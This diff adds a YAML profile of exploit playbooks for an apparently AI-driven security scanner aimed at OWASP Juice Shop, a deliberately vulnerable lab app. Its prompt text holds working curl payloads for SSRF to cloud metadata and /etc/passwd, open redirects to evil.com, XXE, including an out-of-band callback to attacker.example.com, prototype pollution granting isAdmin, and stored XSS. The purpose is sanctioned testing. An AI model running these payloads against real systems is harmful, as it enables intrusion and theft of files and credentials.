@@ -1,0 +1,103 @@
+# Target profile: OWASP Juice Shop v17.1.1
+#
+# Extracted verbatim from orchestrator/playbooks.py, where these exact endpoints
+# were the DEFAULT for every run. On any other target they name paths that do
+# not exist, so they now live here as one profile among others and are selected
+# explicitly with run_config playbooks: juiceshop.
+#
+# Measured caveat: even on its native target this block cost recall
+# (playbook_only 0.1143 vs none 0.1429), so it is opt-in and class-routed
+# rather than injected wholesale.
+
+name: juiceshop
+description: OWASP Juice Shop — exact endpoints and payloads
+playbooks:
+  ssrf: "### EXPLOIT PLAYBOOK — SSRF (A10:2021)\n\nJuice Shop endpoint: POST /profile/image/url with body\
+    \ parameter \"imageUrl\".\nThe server fetches whatever URL you pass; this is classic SSRF.\n\nPayloads\
+    \ to try (in order):\n  1. curl -s -X POST \"{target_url}/profile/image/url\" -H \"Cookie: token=<JWT>\"\
+    \ --data \"imageUrl=http://localhost:3000/ftp/\"\n  2. curl -s -X POST \"{target_url}/profile/image/url\"\
+    \ -H \"Cookie: token=<JWT>\" --data \"imageUrl=http://169.254.169.254/latest/meta-data/\"\n  3. curl\
+    \ -s -X POST \"{target_url}/profile/image/url\" -H \"Cookie: token=<JWT>\" --data \"imageUrl=file:///etc/passwd\"\
+    \n  4. curl -s -X POST \"{target_url}/profile/image/url\" -H \"Cookie: token=<JWT>\" --data \"imageUrl=http://127.0.0.1:22\"\
+    \n\nAuthentication required — obtain a JWT first (login-helper or login with any user).\n\nVerification\
+    \ (any of):\n  - Response includes HTML/directory listing from internal path (/ftp/ output)\n  - Response\
+    \ contains cloud metadata keys (ami-id, iam/, etc.)\n  - Response contains /etc/passwd content or\
+    \ TCP banner (SSH-2.0 etc.)\n  - Request hangs on non-HTTP port (indicates connection attempt)\n\n\
+    If ANY of the above → report finding immediately:\n  {\"action\": \"finding\", \"vuln_type\": \"SSRF\"\
+    , \"severity\": \"high\",\n   \"url\": \"{target_url}/profile/image/url\", \"parameter\": \"imageUrl\"\
+    ,\n   \"evidence\": \"Server fetched internal URL <X> — <signal>\"}"
+  open_redirect: "### EXPLOIT PLAYBOOK — Open Redirect (A01:2021)\n\nJuice Shop endpoint: GET /redirect?to=<URL>.\
+    \ Uses a naive allowlist that can be bypassed.\n\nPayloads to try (in order):\n  1. curl -sI \"{target_url}/redirect?to=https://github.com/bkimminich/juice-shop\"\
+    \   (baseline allowlist)\n  2. curl -sI \"{target_url}/redirect?to=https://www.google.com\"      \
+    \               (outside allowlist — should fail)\n  3. curl -sI \"{target_url}/redirect?to=https://evil.com?github.com/bkimminich/juice-shop\"\
+    \   (allowlist substring bypass)\n  4. curl -sI \"{target_url}/redirect?to=https://evil.com%23github.com/bkimminich/juice-shop\"\
+    \ (fragment bypass)\n  5. curl -sI \"{target_url}/redirect?to=//evil.com\"                       \
+    \          (protocol-relative)\n\nVerification:\n  - Response status 302/301 AND Location header points\
+    \ to attacker-controlled domain (evil.com, google.com, anything NOT allowlisted)\n  - If payload #3\
+    \ or #4 returns Location: evil.com → open redirect confirmed\n\nIf redirect to non-allowlisted domain\
+    \ → report:\n  {\"action\": \"finding\", \"vuln_type\": \"Open Redirect\", \"severity\": \"medium\"\
+    ,\n   \"url\": \"{target_url}/redirect\", \"parameter\": \"to\",\n   \"evidence\": \"Redirects to\
+    \ evil.com via allowlist bypass <payload>\"}"
+  file_upload: "### EXPLOIT PLAYBOOK — Malicious File Upload (A04:2021)\n\nJuice Shop endpoint: POST /file-upload.\
+    \ Validates extension but can be bypassed.\n\nSetup — create payload files in /tmp:\n  echo \"test\
+    \ content\" > /tmp/shell.pdf.zip     (double extension)\n  echo \"test content\" > /tmp/big.pdf  \
+    \         (oversize → trigger size check)\n\nPayloads to try (in order):\n  1. curl -s -X POST \"\
+    {target_url}/file-upload\" -F \"file=@/tmp/shell.pdf.zip\"\n  2. curl -s -X POST \"{target_url}/file-upload\"\
+    \ -F \"file=@/tmp/shell.pdf.zip;type=application/pdf\"\n  3. dd if=/dev/zero of=/tmp/big.pdf bs=1M\
+    \ count=101; curl -s -X POST \"{target_url}/file-upload\" -F \"file=@/tmp/big.pdf\"\n  4. Craft a\
+    \ .zip with embedded .xml or .xxe → see XXE playbook below\n\nVerification:\n  - Response 204/200\
+    \ on .zip file (extension bypass worked)\n  - Server error revealing internal path/framework on oversize\n\
+    \  - File appears in subsequent GET /ftp/ listing\n\nIf any non-pdf/xml extension accepted OR oversize\
+    \ accepted → report:\n  {\"action\": \"finding\", \"vuln_type\": \"File Upload\", \"severity\": \"\
+    medium\",\n   \"url\": \"{target_url}/file-upload\", \"parameter\": \"file\",\n   \"evidence\": \"\
+    Accepted <filename> despite type=<X>\"}"
+  xxe: "### EXPLOIT PLAYBOOK — XXE (A05:2021)\n\nJuice Shop endpoint: POST /file-upload when file extension\
+    \ is .xml — server parses XML\nwith external entities enabled (vulnerable libxmljs version).\n\nSetup\
+    \ — create XXE payload in /tmp:\n  cat > /tmp/xxe.xml << 'EOF'\n  <?xml version=\"1.0\" encoding=\"\
+    UTF-8\"?>\n  <!DOCTYPE foo [\n    <!ELEMENT foo ANY>\n    <!ENTITY xxe SYSTEM \"file:///etc/passwd\"\
+    >\n  ]>\n  <foo>&xxe;</foo>\n  EOF\n\n  # Out-of-band variant (DNS/HTTP callback)\n  cat > /tmp/xxe_oob.xml\
+    \ << 'EOF'\n  <?xml version=\"1.0\"?>\n  <!DOCTYPE foo [\n    <!ENTITY xxe SYSTEM \"http://attacker.example.com/steal\"\
+    >\n  ]>\n  <foo>&xxe;</foo>\n  EOF\n\nPayloads to try:\n  1. curl -s -X POST \"{target_url}/file-upload\"\
+    \ -F \"file=@/tmp/xxe.xml;type=text/xml\"\n  2. curl -s -X POST \"{target_url}/file-upload\" -F \"\
+    file=@/tmp/xxe.xml;type=application/xml\"\n  3. Pack xxe.xml into a zip and upload:\n       cd /tmp\
+    \ && zip xxebomb.zip xxe.xml\n       curl -s -X POST \"{target_url}/file-upload\" -F \"file=@/tmp/xxebomb.zip\"\
+    \n\nVerification:\n  - Response body contains /etc/passwd content (root:x:0:0:...)\n  - Response includes\
+    \ a timeout/denial-of-service delay (quadratic blowup entity)\n  - Response reflects parsed XML with\
+    \ entity expansion\n\nIf file content appears in response → report:\n  {\"action\": \"finding\", \"\
+    vuln_type\": \"XXE\", \"severity\": \"high\",\n   \"url\": \"{target_url}/file-upload\", \"parameter\"\
+    : \"file\",\n   \"evidence\": \"XML external entity resolved — /etc/passwd leaked\"}"
+  prototype_pollution: "### EXPLOIT PLAYBOOK — Prototype Pollution (A03:2021)\n\nJuice Shop endpoint:\
+    \ PUT /api/Users/:id or POST /api/Users with JSON body containing\n__proto__ — Node.js merges user\
+    \ input into Object.prototype.\n\nPayloads to try (in order):\n  1. curl -s -X POST \"{target_url}/api/Users\"\
+    \ \\\\\n       -H \"Content-Type: application/json\" \\\\\n       -d '{\"email\":\"pp@test.com\",\"\
+    password\":\"Test1!\",\"__proto__\":{\"polluted\":\"yes\"}}'\n\n  2. curl -s -X PUT \"{target_url}/api/Users/1\"\
+    \ \\\\\n       -H \"Content-Type: application/json\" \\\\\n       -H \"Cookie: token=<JWT>\" \\\\\n\
+    \       -d '{\"__proto__\":{\"isAdmin\":true}}'\n\n  3. curl -s -X POST \"{target_url}/api/Users\"\
+    \ \\\\\n       -H \"Content-Type: application/json\" \\\\\n       -d '{\"constructor\":{\"prototype\"\
+    :{\"polluted\":\"yes\"}}}'\n\n  4. Verification ping — check if pollution stuck:\n     curl -s \"\
+    {target_url}/rest/user/whoami\" -H \"Cookie: token=<JWT>\"\n     (look for \"polluted\":\"yes\" OR\
+    \ \"isAdmin\":true on an unrelated object)\n\nVerification (any of):\n  - Response echoes back the\
+    \ pollution key on a DIFFERENT endpoint's response\n  - Server behaviour changes (unauthorized endpoint\
+    \ returns 200)\n  - Error message mentions \"Object.prototype\" or similar\n\nIf pollution reflected\
+    \ on unrelated response → report:\n  {\"action\": \"finding\", \"vuln_type\": \"Prototype Pollution\"\
+    , \"severity\": \"medium\",\n   \"url\": \"{target_url}/api/Users\", \"parameter\": \"__proto__\"\
+    ,\n   \"evidence\": \"__proto__ merged into Object.prototype — <signal>\"}"
+  stored_xss: "### EXPLOIT PLAYBOOK — Stored XSS (A03:2021)\n\nJuice Shop storage: user profile \"username\"\
+    \ field. Rendered UNSANITISED in the admin\npanel and in the product reviews list.\n\nMulti-step attack\
+    \ (this is why it's hard for agents — 3 steps):\n\nSTEP 1 — Register + inject payload:\n  curl -s\
+    \ -X POST \"{target_url}/api/Users\" \\\\\n       -H \"Content-Type: application/json\" \\\\\n   \
+    \    -d '{\"email\":\"xss1@test.com\",\"password\":\"Test1!\",\"username\":\"<iframe src=\\\\\"javascript:alert(`xss`)\\\
+    \\\">\"}'\n\nSTEP 2 — Log in and PUT the username field (sometimes needed on the /user endpoint):\n\
+    \  TOKEN=$(curl -s -X POST \"{target_url}/rest/user/login\" -H \"Content-Type: application/json\"\
+    \ -d '{\"email\":\"xss1@test.com\",\"password\":\"Test1!\"}' | grep -oP 'token\":\"[^\"]+' | cut -d'\"\
+    ' -f3)\n  curl -s -X PUT \"{target_url}/api/Users/<uid>\" -H \"Cookie: token=$TOKEN\" -H \"Content-Type:\
+    \ application/json\" -d '{\"username\":\"<iframe src=\\\\\"javascript:alert(\\\\'xss\\\\')\\\\\">\"\
+    }'\n\nSTEP 3 — Trigger (retrieve as admin OR check review list):\n  curl -s \"{target_url}/api/Users\"\
+    \ | grep -i \"<iframe\\\\|<script\\\\|javascript:\"\n  curl -s \"{target_url}/api/Users/<uid>\" |\
+    \ grep -i \"<iframe\\\\|<script\\\\|javascript:\"\n\nVerification:\n  - Response returns raw <iframe>\
+    \ / <script> / javascript: in the username field\n    (NOT &lt;iframe&gt; — if encoded, NOT vulnerable)\n\
+    \  - Admin dashboard HTML (requires admin token) contains the payload literally\n\nAlternative payloads\
+    \ (if <iframe> filtered):\n  - <img src=x onerror=alert(1)>\n  - <svg/onload=alert(1)>\n  - \"><script>alert(1)</script>\n\
+    \nIf unencoded payload in response → report:\n  {\"action\": \"finding\", \"vuln_type\": \"Stored\
+    \ XSS\", \"severity\": \"high\",\n   \"url\": \"{target_url}/api/Users\", \"parameter\": \"username\"\
+    ,\n   \"evidence\": \"Payload <X> stored and returned unencoded in GET /api/Users\"}"
